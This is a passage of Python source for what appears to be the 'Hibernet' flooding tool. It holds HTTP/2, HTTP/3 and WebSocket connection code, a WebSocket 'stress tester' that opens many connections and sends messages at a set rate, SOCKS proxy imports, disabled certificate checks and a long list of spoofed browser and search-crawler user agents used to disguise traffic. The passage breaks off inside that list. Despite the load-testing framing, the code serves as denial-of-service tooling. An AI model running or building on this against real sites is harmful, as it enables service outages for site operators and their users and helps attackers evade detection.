import socket
import socks
import threading
import random
import re
import urllib.request
import os
import sys
import time
import ssl

# Enhanced HTTP/2 support with proper error handling and connection management
import logging
from typing import Optional, Tuple, Dict, List, Any
from dataclasses import dataclass
from enum import Enum

try:
    import h2.connection
    import h2.events
    import h2.settings
    import h2.config
    import h2.errors
    HTTP2_AVAILABLE = True
except ImportError:
    HTTP2_AVAILABLE = False
    print("HTTP/2 library not available. Install h2 for HTTP/2 support: pip install h2")

# Configure logging for HTTP/2
logging.basicConfig(level=logging.INFO)
http2_logger = logging.getLogger('hibernet.http2')

class HTTP2ConnectionState(Enum):
    """HTTP/2 connection states"""
    IDLE = "idle"
    CONNECTING = "connecting"
    CONNECTED = "connected"
    CLOSED = "closed"
    ERROR = "error"

@dataclass
class HTTP2Config:
    """HTTP/2 configuration settings"""
    max_concurrent_streams: int = 100
    initial_window_size: int = 65535
    max_frame_size: int = 16384
    header_table_size: int = 4096
    enable_push: bool = False
    max_header_list_size: int = 8192
    connection_timeout: float = 30.0
    stream_timeout: float = 10.0

    @classmethod
    def from_timeout_config(cls, timeout_config):
        """Create HTTP2Config from timeout configuration"""
        return cls(
            connection_timeout=float(timeout_config.connection_timeout),
            stream_timeout=float(timeout_config.read_timeout)
        )

@dataclass
class HTTP2Response:
    """HTTP/2 response data"""
    status_code: int
    headers: Dict[str, str]
    data: bytes
    stream_id: int
    response_time: float

class HTTP2ConnectionManager:
    """Enhanced HTTP/2 connection manager with proper error handling"""

    def __init__(self, host: str, port: int = 443, use_ssl: bool = True, config: Optional[HTTP2Config] = None):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.config = config or HTTP2Config()
        self.state = HTTP2ConnectionState.IDLE
        self.socket: Optional[socket.socket] = None
        self.h2_conn: Optional[h2.connection.H2Connection] = None
        self.lock = threading.RLock()
        self.last_activity = time.time()

    def connect(self) -> bool:
        """Establish HTTP/2 connection with proper error handling"""
        if not HTTP2_AVAILABLE:
            http2_logger.error("HTTP/2 library not available")
            return False

        with self.lock:
            try:
                self.state = HTTP2ConnectionState.CONNECTING

                # Create socket connection
                self.socket = socket.create_connection(
                    (self.host, self.port),
                    timeout=self.config.connection_timeout
                )
                self.socket.settimeout(self.config.stream_timeout)

                # Setup SSL if required
                if self.use_ssl:
                    context = self._create_ssl_context()
                    self.socket = context.wrap_socket(
                        self.socket,
                        server_hostname=self.host
                    )

                    # Verify ALPN negotiation for HTTP/2
                    if hasattr(self.socket, 'selected_alpn_protocol'):
                        protocol = self.socket.selected_alpn_protocol()
                        if protocol != 'h2':
                            http2_logger.warning(f"Server negotiated {protocol} instead of h2")

                # Initialize HTTP/2 connection
                h2_config = h2.config.H2Configuration(client_side=True)
                self.h2_conn = h2.connection.H2Connection(config=h2_config)

                # Configure HTTP/2 settings
                self._configure_h2_settings()

                # Initiate connection
                self.h2_conn.initiate_connection()
                self._send_data()

                # Handle server settings
                self._handle_initial_response()

                self.state = HTTP2ConnectionState.CONNECTED
                self.last_activity = time.time()
                http2_logger.info(f"HTTP/2 connection established to {self.host}:{self.port}")
                return True

            except Exception as e:
                http2_logger.error(f"Failed to establish HTTP/2 connection to {self.host}:{self.port}: {e}")
                self.state = HTTP2ConnectionState.ERROR
                self._cleanup()
                return False

    def _create_ssl_context(self) -> ssl.SSLContext:
        """Create SSL context with HTTP/2 ALPN support"""
        context = ssl.create_default_context()

        # Enable HTTP/2 ALPN
        context.set_alpn_protocols(['h2', 'http/1.1'])

        # For testing purposes - in production, proper certificate validation should be used
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        return context

    def _configure_h2_settings(self):
        """Configure HTTP/2 settings"""
        settings = {
            h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: self.config.max_concurrent_streams,
            h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: self.config.initial_window_size,
            h2.settings.SettingCodes.MAX_FRAME_SIZE: self.config.max_frame_size,
            h2.settings.SettingCodes.HEADER_TABLE_SIZE: self.config.header_table_size,
            h2.settings.SettingCodes.ENABLE_PUSH: 1 if self.config.enable_push else 0,
            h2.settings.SettingCodes.MAX_HEADER_LIST_SIZE: self.config.max_header_list_size,
        }

        self.h2_conn.update_settings(settings)

    def _send_data(self):
        """Send pending data to server"""
        data = self.h2_conn.data_to_send()
        if data:
            self.socket.sendall(data)
            self.last_activity = time.time()

    def _handle_initial_response(self):
        """Handle initial server response and settings"""
        try:
            # Read initial response
            data = self.socket.recv(8192)
            if data:
                events = self.h2_conn.receive_data(data)
                for event in events:
                    if isinstance(event, h2.events.SettingsReceived):
                        http2_logger.debug("Received server settings")
                    elif isinstance(event, h2.events.WindowUpdated):
                        http2_logger.debug(f"Window updated: {event.delta}")

                self._send_data()  # Send any pending acknowledgments

        except socket.timeout:
            http2_logger.debug("No initial response from server (timeout)")
        except Exception as e:
            http2_logger.warning(f"Error handling initial response: {e}")

    def is_connected(self) -> bool:
        """Check if connection is active"""
        return (self.state == HTTP2ConnectionState.CONNECTED and
                self.socket is not None and
                self.h2_conn is not None)

    def close(self):
        """Close HTTP/2 connection"""
        with self.lock:
            try:
                if self.h2_conn:
                    self.h2_conn.close_connection()
                    self._send_data()

                self._cleanup()
                self.state = HTTP2ConnectionState.CLOSED
                http2_logger.info(f"HTTP/2 connection to {self.host}:{self.port} closed")

            except Exception as e:
                http2_logger.error(f"Error closing connection: {e}")

    def _cleanup(self):
        """Clean up connection resources"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None

        self.h2_conn = None

# Enhanced HTTP/2 connection functions with backward compatibility
def create_http2_connection(host, port=443, use_ssl=True):
    """Create an HTTP/2 connection with enhanced error handling"""
    if not HTTP2_AVAILABLE:
        return None

    try:
        # Create SSL context for HTTPS connections
        if use_ssl:
            context = ssl.create_default_context()
            # Enable HTTP/2 ALPN
            context.set_alpn_protocols(['h2', 'http/1.1'])
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            timeout_config = load_timeout_config()
            sock = socket.create_connection((host, port), timeout=timeout_config.connection_timeout)
            sock = context.wrap_socket(sock, server_hostname=host)

            # Verify ALPN negotiation
            if hasattr(sock, 'selected_alpn_protocol'):
                protocol = sock.selected_alpn_protocol()
                if protocol != 'h2':
                    http2_logger.warning(f"Server negotiated {protocol} instead of h2")
        else:
            timeout_config = load_timeout_config()
            sock = socket.create_connection((host, port), timeout=timeout_config.connection_timeout)

        # Set socket timeout for operations
        sock.settimeout(10)

        # Create HTTP/2 connection with proper configuration
        h2_config = h2.config.H2Configuration(client_side=True)
        conn = h2.connection.H2Connection(config=h2_config)

        # Configure settings
        settings = {
            h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: 100,
            h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: 65535,
            h2.settings.SettingCodes.MAX_FRAME_SIZE: 16384,
            h2.settings.SettingCodes.ENABLE_PUSH: 0,
        }
        conn.update_settings(settings)

        # Initiate connection
        conn.initiate_connection()
        data = conn.data_to_send()
        if data:
            sock.sendall(data)

        # Handle initial server response
        try:
            response_data = sock.recv(8192)
            if response_data:
                events = conn.receive_data(response_data)
                # Send any pending acknowledgments
                ack_data = conn.data_to_send()
                if ack_data:
                    sock.sendall(ack_data)
        except socket.timeout:
            pass  # No initial response is okay

        return sock, conn

    except Exception as e:
        http2_logger.error(f"Failed to create HTTP/2 connection to {host}:{port}: {e}")
        return None

def send_http2_request(sock, conn, headers, body=b""):
    """Send an HTTP/2 request with enhanced error handling"""
    if not HTTP2_AVAILABLE or sock is None or conn is None:
        return False

    try:
        # Prepare headers in HTTP/2 format
        header_list = []

        # Process headers - handle both string and tuple formats
        for header in headers:
            if isinstance(header, tuple):
                name, value = header
            elif isinstance(header, str) and ":" in header:
                name, value = header.split(":", 1)
            else:
                continue  # Skip invalid headers

            name = name.strip().lower()
            value = value.strip()

            # Skip connection-specific headers that are not allowed in HTTP/2
            if name in ['connection', 'upgrade', 'http2-settings']:
                continue

            header_list.append((name, value))

        # Get stream ID
        stream_id = conn.get_next_available_stream_id()

        # Send headers
        conn.send_headers(stream_id, header_list, end_stream=(len(body) == 0))

        # Send body if present
        if body:
            conn.send_data(stream_id, body, end_stream=True)

        # Send all pending data
        data = conn.data_to_send()
        if data:
            sock.sendall(data)

        return True

    except Exception as e:
        http2_logger.error(f"Failed to send HTTP/2 request: {e}")
        return False

# HTTP/3 (QUIC) Support Implementation
try:
    import asyncio
    from aioquic.asyncio import connect
    from aioquic.h3.connection import H3_ALPN, H3Connection
    from aioquic.h3.events import DataReceived, HeadersReceived
    from aioquic.quic.configuration import QuicConfiguration
    from aioquic.quic.events import QuicEvent
    HTTP3_AVAILABLE = True
except ImportError:
    HTTP3_AVAILABLE = False
    print("HTTP/3 library not available. Install aioquic for HTTP/3 support: pip install aioquic")

@dataclass
class HTTP3Config:
    """HTTP/3 configuration settings"""
    max_concurrent_streams: int = 100
    connection_timeout: float = 30.0
    stream_timeout: float = 10.0
    verify_mode: bool = False  # For testing purposes
    alpn_protocols: List[str] = None

    @classmethod
    def from_timeout_config(cls, timeout_config):
        """Create HTTP3Config from timeout configuration"""
        return cls(
            connection_timeout=float(timeout_config.connection_timeout),
            stream_timeout=float(timeout_config.read_timeout)
        )

    def __post_init__(self):
        if self.alpn_protocols is None:
            self.alpn_protocols = H3_ALPN

@dataclass
class HTTP3Response:
    """HTTP/3 response data"""
    status_code: int
    headers: Dict[str, str]
    data: bytes
    stream_id: int
    response_time: float

class HTTP3Connection:
    """HTTP/3 (QUIC) connection manager"""

    def __init__(self, host: str, port: int = 443, config: Optional[HTTP3Config] = None):
        self.host = host
        self.port = port
        self.config = config or HTTP3Config()
        self.connection = None
        self.transport = None
        self.h3_conn = None
        self.stream_responses = {}
        self.stream_events = {}
        self.lock = asyncio.Lock()

    async def connect(self) -> bool:
        """Establish HTTP/3 connection"""
        if not HTTP3_AVAILABLE:
            http2_logger.error("HTTP/3 library not available")
            return False

        try:
            # Create QUIC configuration
            quic_config = QuicConfiguration(
                alpn_protocols=self.config.alpn_protocols,
                is_client=True,
                verify_mode=ssl.CERT_NONE if not self.config.verify_mode else ssl.CERT_REQUIRED
            )

            # Connect using aioquic
            self.connection = await connect(
                self.host,
                self.port,
                configuration=quic_config,
                create_protocol=lambda: HTTP3ClientProtocol(self)
            )

            # Initialize H3 connection
            self.h3_conn = H3Connection(self.connection._quic)

            http2_logger.info(f"HTTP/3 connection established to {self.host}:{self.port}")
            return True

        except Exception as e:
            http2_logger.error(f"Failed to establish HTTP/3 connection to {self.host}:{self.port}: {e}")
            return False

    async def send_request(self, method: str = "GET", path: str = "/",
                          headers: Optional[Dict[str, str]] = None,
                          body: bytes = b"") -> Optional[HTTP3Response]:
        """Send HTTP/3 request"""
        if not self.h3_conn:
            if not await self.connect():
                return None

        async with self.lock:
            try:
                # Prepare headers
                request_headers = self._prepare_headers(method, path, headers, body)

                # Get stream ID
                stream_id = self.h3_conn.get_next_available_stream_id()

                # Send request
                self.h3_conn.send_headers(
                    stream_id=stream_id,
                    headers=request_headers,
                    end_stream=(len(body) == 0)
                )

                if body:
                    self.h3_conn.send_data(stream_id=stream_id, data=body, end_stream=True)

                # Wait for response
                response = await self._wait_for_response(stream_id)
                return response

            except Exception as e:
                http2_logger.error(f"Error sending HTTP/3 request: {e}")
                return None

    def _prepare_headers(self, method: str, path: str, headers: Optional[Dict[str, str]],
                        body: bytes) -> List[Tuple[bytes, bytes]]:
        """Prepare HTTP/3 headers"""
        request_headers = [
            (b':method', method.upper().encode()),
            (b':path', path.encode()),
            (b':scheme', b'https'),
            (b':authority', f"{self.host}:{self.port}".encode())
        ]

        if body:
            request_headers.append((b'content-length', str(len(body)).encode()))

        if headers:
            for name, value in headers.items():
                name_lower = name.lower()
                if not name_lower.startswith(':') and name_lower not in ['connection', 'upgrade']:
                    request_headers.append((name_lower.encode(), str(value).encode()))

        return request_headers

    async def _wait_for_response(self, stream_id: int) -> Optional[HTTP3Response]:
        """Wait for HTTP/3 response"""
        start_time = time.time()

        try:
            # Create event for this stream
            event = asyncio.Event()
            self.stream_events[stream_id] = event

            # Wait for response with timeout
            await asyncio.wait_for(event.wait(), timeout=self.config.stream_timeout)

            # Get response data
            if stream_id in self.stream_responses:
                response_data = self.stream_responses[stream_id]
                response_time = time.time() - start_time

                return HTTP3Response(
                    status_code=response_data.get('status', 0),
                    headers=response_data.get('headers', {}),
                    data=response_data.get('data', b''),
                    stream_id=stream_id,
                    response_time=response_time
                )

            return None

        except asyncio.TimeoutError:
            http2_logger.warning(f"HTTP/3 response timeout for stream {stream_id}")
            return None
        except Exception as e:
            http2_logger.error(f"Error waiting for HTTP/3 response: {e}")
            return None
        finally:
            # Cleanup
            if stream_id in self.stream_events:
                del self.stream_events[stream_id]
            if stream_id in self.stream_responses:
                del self.stream_responses[stream_id]

    async def close(self):
        """Close HTTP/3 connection"""
        try:
            if self.connection:
                self.connection.close()
            http2_logger.info(f"HTTP/3 connection to {self.host}:{self.port} closed")
        except Exception as e:
            http2_logger.error(f"Error closing HTTP/3 connection: {e}")

class HTTP3ClientProtocol:
    """HTTP/3 client protocol handler"""

    def __init__(self, connection_manager):
        self.connection_manager = connection_manager

    def quic_event_received(self, event: QuicEvent):
        """Handle QUIC events"""
        try:
            if hasattr(event, 'stream_id'):
                stream_id = event.stream_id

                if isinstance(event, HeadersReceived):
                    # Process headers
                    headers = {}
                    status = 200

                    for name, value in event.headers:
                        if name == b':status':
                            status = int(value.decode())
                        else:
                            headers[name.decode()] = value.decode()

                    if stream_id not in self.connection_manager.stream_responses:
                        self.connection_manager.stream_responses[stream_id] = {}

                    self.connection_manager.stream_responses[stream_id]['status'] = status
                    self.connection_manager.stream_responses[stream_id]['headers'] = headers

                elif isinstance(event, DataReceived):
                    # Process data
                    if stream_id not in self.connection_manager.stream_responses:
                        self.connection_manager.stream_responses[stream_id] = {}

                    existing_data = self.connection_manager.stream_responses[stream_id].get('data', b'')
                    self.connection_manager.stream_responses[stream_id]['data'] = existing_data + event.data

                    # If stream ended, signal completion
                    if event.end_stream and stream_id in self.connection_manager.stream_events:
                        self.connection_manager.stream_events[stream_id].set()

        except Exception as e:
            http2_logger.error(f"Error processing HTTP/3 event: {e}")

# Factory functions for HTTP/3
async def create_http3_connection(host: str, port: int = 443) -> Optional[HTTP3Connection]:
    """Create HTTP/3 connection"""
    if not HTTP3_AVAILABLE:
        return None

    conn = HTTP3Connection(host, port)
    if await conn.connect():
        return conn
    return None

async def send_http3_request(connection: HTTP3Connection, method: str = "GET",
                           path: str = "/", headers: Optional[Dict[str, str]] = None,
                           body: bytes = b"") -> Optional[HTTP3Response]:
    """Send HTTP/3 request"""
    if not HTTP3_AVAILABLE or not connection:
        return None

    return await connection.send_request(method, path, headers, body)

# WebSocket Stress Testing Implementation
import base64
import hashlib
import struct

try:
    import websockets
    import asyncio
    WEBSOCKET_AVAILABLE = True
except ImportError:
    WEBSOCKET_AVAILABLE = False
    print("WebSocket library not available. Install websockets for WebSocket support: pip install websockets")

@dataclass
class WebSocketConfig:
    """WebSocket configuration settings"""
    max_connections: int = 100
    connection_timeout: float = 30.0
    ping_interval: float = 20.0
    ping_timeout: float = 10.0
    close_timeout: float = 10.0
    max_size: int = 2**20  # 1MB
    compression: Optional[str] = None  # 'deflate' or None

    @classmethod
    def from_timeout_config(cls, timeout_config):
        """Create WebSocketConfig from timeout configuration"""
        return cls(
            connection_timeout=float(timeout_config.connection_timeout),
            ping_timeout=float(timeout_config.read_timeout),
            close_timeout=float(timeout_config.write_timeout)
        )

@dataclass
class WebSocketMessage:
    """WebSocket message data"""
    message_type: str  # 'text', 'binary', 'ping', 'pong', 'close'
    data: bytes
    timestamp: float

class WebSocketStressTester:
    """WebSocket stress testing implementation"""

    def __init__(self, uri: str, config: Optional[WebSocketConfig] = None):
        self.uri = uri
        self.config = config or WebSocketConfig()
        self.connections = []
        self.message_stats = {
            'sent': 0,
            'received': 0,
            'errors': 0,
            'connections_established': 0,
            'connections_failed': 0
        }
        self.lock = asyncio.Lock()

    async def create_connection(self, extra_headers: Optional[Dict[str, str]] = None) -> Optional[object]:
        """Create a single WebSocket connection"""
        if not WEBSOCKET_AVAILABLE:
            http2_logger.error("WebSocket library not available")
            return None

        try:
            # Prepare connection parameters
            kwargs = {
                'ping_interval': self.config.ping_interval,
                'ping_timeout': self.config.ping_timeout,
                'close_timeout': self.config.close_timeout,
                'max_size': self.config.max_size,
            }

            if self.config.compression:
                kwargs['compression'] = self.config.compression

            if extra_headers:
                kwargs['extra_headers'] = extra_headers

            # Create connection
            websocket = await asyncio.wait_for(
                websockets.connect(self.uri, **kwargs),
                timeout=self.config.connection_timeout
            )

            async with self.lock:
                self.message_stats['connections_established'] += 1
                self.connections.append(websocket)

            return websocket

        except Exception as e:
            async with self.lock:
                self.message_stats['connections_failed'] += 1
            http2_logger.error(f"Failed to create WebSocket connection: {e}")
            return None

    async def send_message(self, websocket, message: str, message_type: str = 'text'):
        """Send a message through WebSocket"""
        try:
            if message_type == 'text':
                await websocket.send(message)
            elif message_type == 'binary':
                await websocket.send(message.encode() if isinstance(message, str) else message)
            elif message_type == 'ping':
                await websocket.ping(message.encode() if isinstance(message, str) else message)

            async with self.lock:
                self.message_stats['sent'] += 1

        except Exception as e:
            async with self.lock:
                self.message_stats['errors'] += 1
            http2_logger.error(f"Failed to send WebSocket message: {e}")

    async def receive_messages(self, websocket, duration: float = 60.0):
        """Receive messages from WebSocket"""
        start_time = time.time()

        try:
            while time.time() - start_time < duration:
                try:
                    message = await asyncio.wait_for(websocket.recv(), timeout=1.0)
                    async with self.lock:
                        self.message_stats['received'] += 1

                except asyncio.TimeoutError:
                    continue  # Continue listening
                except Exception as e:
                    http2_logger.debug(f"Error receiving WebSocket message: {e}")
                    break

        except Exception as e:
            async with self.lock:
                self.message_stats['errors'] += 1
            http2_logger.error(f"Error in WebSocket receive loop: {e}")

    async def stress_test_connection(self, connection_id: int, messages_per_second: int = 10,
                                   duration: float = 60.0, message_template: str = "Test message {}"):
        """Stress test a single WebSocket connection"""
        websocket = await self.create_connection({
            'User-Agent': random.choice(useragents),
            'X-Connection-ID': str(connection_id)
        })

        if not websocket:
            return

        try:
            # Start receiving messages in background
            receive_task = asyncio.create_task(
                self.receive_messages(websocket, duration)
            )

            # Send messages at specified rate
            message_interval = 1.0 / messages_per_second
            start_time = time.time()
            message_count = 0

            while time.time() - start_time < duration:
                message = message_template.format(message_count)
                await self.send_message(websocket, message)
                message_count += 1

                # Wait for next message interval
                await asyncio.sleep(message_interval)

            # Wait for receive task to complete
            await receive_task

        except Exception as e:
            http2_logger.error(f"Error in WebSocket stress test: {e}")
        finally:
            try:
                await websocket.close()
            except:
                pass

    async def run_stress_test(self, num_connections: int = 10, messages_per_second: int = 10,
                            duration: float = 60.0, message_template: str = "Test message {}"):
        """Run WebSocket stress test with multiple connections"""
        if not WEBSOCKET_AVAILABLE:
            http2_logger.error("WebSocket library not available")
            return

        http2_logger.info(f"Starting WebSocket stress test: {num_connections} connections, "
                         f"{messages_per_second} msg/sec, {duration}s duration")

        # Create tasks for all connections
        tasks = []
        for i in range(num_connections):
            task = asyncio.create_task(
                self.stress_test_connection(i, messages_per_second, duration, message_template)
            )
            tasks.append(task)

        # Wait for all tasks to complete
        await asyncio.gather(*tasks, return_exceptions=True)

        # Print statistics
        async with self.lock:
            http2_logger.info(f"WebSocket stress test completed:")
            http2_logger.info(f"  Connections established: {self.message_stats['connections_established']}")
            http2_logger.info(f"  Connections failed: {self.message_stats['connections_failed']}")
            http2_logger.info(f"  Messages sent: {self.message_stats['sent']}")
            http2_logger.info(f"  Messages received: {self.message_stats['received']}")
            http2_logger.info(f"  Errors: {self.message_stats['errors']}")

    def get_stats(self) -> Dict[str, int]:
        """Get current statistics"""
        return self.message_stats.copy()

# Manual WebSocket implementation for environments without websockets library
class ManualWebSocketConnection:
    """Manual WebSocket implementation using raw sockets"""

    def __init__(self, host: str, port: int, path: str = "/", use_ssl: bool = False):
        self.host = host
        self.port = port
        self.path = path
        self.use_ssl = use_ssl
        self.socket = None
        self.connected = False

    def _generate_websocket_key(self) -> str:
        """Generate WebSocket key for handshake"""
        key = base64.b64encode(os.urandom(16)).decode()
        return key

    def _create_handshake_request(self, key: str, extra_headers: Optional[Dict[str, str]] = None) -> str:
        """Create WebSocket handshake request"""
        request = f"GET {self.path} HTTP/1.1\r\n"
        request += f"Host: {self.host}:{self.port}\r\n"
        request += "Upgrade: websocket\r\n"
        request += "Connection: Upgrade\r\n"
        request += f"Sec-WebSocket-Key: {key}\r\n"
        request += "Sec-WebSocket-Version: 13\r\n"
        request += f"User-Agent: {random.choice(useragents)}\r\n"

        if extra_headers:
            for name, value in extra_headers.items():
                request += f"{name}: {value}\r\n"

        request += "\r\n"
        return request

    def connect(self, extra_headers: Optional[Dict[str, str]] = None) -> bool:
        """Connect to WebSocket server"""
        try:
            # Create socket
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)

            # Connect
            self.socket.connect((self.host, self.port))

            # Wrap with SSL if needed
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                self.socket = context.wrap_socket(self.socket, server_hostname=self.host)

            # Perform WebSocket handshake
            key = self._generate_websocket_key()
            handshake = self._create_handshake_request(key, extra_headers)

            self.socket.send(handshake.encode())

            # Read handshake response
            response = self.socket.recv(1024).decode()

            if "101 Switching Protocols" in response:
                self.connected = True
                return True
            else:
                http2_logger.error(f"WebSocket handshake failed: {response}")
                return False

        except Exception as e:
            http2_logger.error(f"Failed to connect to WebSocket: {e}")
            return False

    def send_text(self, message: str) -> bool:
        """Send text message"""
        if not self.connected:
            return False

        try:
            # Create WebSocket frame for text message
            payload = message.encode('utf-8')
            frame = self._create_frame(0x1, payload)  # 0x1 = text frame
            self.socket.send(frame)
            return True
        except Exception as e:
            http2_logger.error(f"Failed to send WebSocket message: {e}")
            return False

    def _create_frame(self, opcode: int, payload: bytes) -> bytes:
        """Create WebSocket frame"""
        frame = bytearray()

        # First byte: FIN (1) + RSV (000) + Opcode (4 bits)
        frame.append(0x80 | opcode)

        # Payload length
        payload_len = len(payload)
        if payload_len < 126:
            frame.append(0x80 | payload_len)  # MASK (1) + payload length
        elif payload_len < 65536:
            frame.append(0x80 | 126)
            frame.extend(struct.pack('>H', payload_len))
        else:
            frame.append(0x80 | 127)
            frame.extend(struct.pack('>Q', payload_len))

        # Masking key (4 bytes)
        mask = os.urandom(4)
        frame.extend(mask)

        # Masked payload
        masked_payload = bytearray()
        for i, byte in enumerate(payload):
            masked_payload.append(byte ^ mask[i % 4])

        frame.extend(masked_payload)
        return bytes(frame)

    def close(self):
        """Close WebSocket connection"""
        if self.socket:
            try:
                if self.connected:
                    # Send close frame
                    close_frame = self._create_frame(0x8, b'')  # 0x8 = close frame
                    self.socket.send(close_frame)
                self.socket.close()
            except:
                pass
            finally:
                self.connected = False
                self.socket = None

# Factory functions for WebSocket
def create_websocket_tester(uri: str, config: Optional[WebSocketConfig] = None) -> WebSocketStressTester:
    """Create WebSocket stress tester"""
    return WebSocketStressTester(uri, config)

def create_manual_websocket(host: str, port: int, path: str = "/", use_ssl: bool = False) -> ManualWebSocketConnection:
    """Create manual WebSocket connection"""
    return ManualWebSocketConnection(host, port, path, use_ssl)


print('''


  hh   hh  iii  bbbbbbb  eeeeeee  rrrrrrrr  nn     nnn  eeeeeee  ttttttttt
  hh   hh  iii  bb   bb  eeeeeee  rr    rr  nnn    nnn  eeeeeee     ttt
  hh   hh  iii  bb   bb  ee       rr    rr  nnnn   nnn  ee          ttt
  hh   hh  iii  bbbbbbb  ee       rrrrrrrr  nnnnnnnnnn  ee          ttt
  hhhhhhh  iii  bb       eeeeeee  rrrr      nnnnnnnnnn  eeeeeee     ttt
  hh   hh  iii  bbbbbbb  ee       rr rr     nnnnnnnnnn  ee          ttt
  hh   hh  iii  bb   bb  ee       rr  rr    nn  nnnnnn  ee          ttt
  hh   hh  iii  bb   bb  eeeeeee  rr   rr   nnn  nnnnn  eeeeeee     ttt
  hh   hh  iii  bbbbbbb  eeeeeee  rr    rr  nnnn  nnnn  eeeeeee     ttt


							C0d3d by All3xJ
	''') # la grafica ci sta



useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
			"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
			"Baiduspider ( http://www.baidu.com/search/spider.htm)",
			"BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103",
			"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0)",
			"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
			"BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100",
			"BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105",
			"BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
			"BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
			"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
			"Bloglines/3.1 (http://www.bloglines.com)",
			"CSSCheck/1.2.2",
			"Dillo/2.0",
			"DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
			"DoCoMo/2.0 SH901iC(c100;TB;W24H12)",
			"Download Demon/3.5.0.11",
			"ELinks/0.12~pre5-4",
			"ELinks (0.4pre5; Linux 2.6.10-ac7 i686; 80x33)",
			"ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41)",
			"EmailWolf 1.00",
			"everyfeed-spider/2.0 (http://www.everyfeed.com)",
			"facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)",
			"FAST-WebCrawler/3.8 (crawler at trd dot overture dot com; http://www.alltheweb.com/help/webmaster/crawler)",
			"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
			"Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php)",
			"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
			"Googlebot-Image/1.0",
			"Googlebot-News",
			"Googlebot-Video/1.0",
			"Gregarius/0.5.2 ( http://devlog.gregarius.net/docs/ua)",
			"grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)",
			"Gulper Web Bot 0.2.4 (www.ecsl.cs.sunysb.edu/~maxim/cgi-bin/Link/GulperBot)",
			"HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"HTC-ST7377/1.59.502.3 (67150) Opera/9.50 (Windows NT 5.1; U; en) UP.Link/6.3.1.17.0",
			"HTMLParser/1.6",
			"iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2)",
			"iTunes/9.0.2 (Windows; N)",
			"iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)",
			"Java/1.6.0_13",
			"Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0",
			"Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)",
			"LG-GC900/V10a Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1",
			"LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"libwww-perl/5.820",
			"Links/0.9.1 (Linux 2.4.24; i386;)",
			"Links (2.1pre15; FreeBSD 5.3-RELEASE i386; 196x84)",
			"Links (2.1pre15; Linux 2.4.26 i686; 158x61)",
			"Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)",
			"Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12",
			"Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d",
			"Mediapartners-Google",
			"Microsoft URL Control - 6.00.8862",
			"Midori/0.1.10 (X11; Linux i686; U; en-us) WebKit/(531).(2) ",
			"MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"MOTORIZR-Z8/46.00.00 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 356) Opera 8.65 [it] UP.Link/6.3.0.0.0",
			"MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12 (GUI) MMP/2.0 UP.Link/6.3.1.13.0",
			"MOT-V9mm/00.62 UP.Browser/6.2.3.4.c.1.123 (GUI) MMP/2.0",
			"Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2.1",
			"Mozilla/2.02E (Win95; U)",
			"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
			"Mozilla/3.01Gold (Win95; I)",
			"Mozilla/3.0 (compatible; NetPositive/2.1.1; BeOS)",
			"Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 600x800)",
			"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; MDA Pro/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1)",
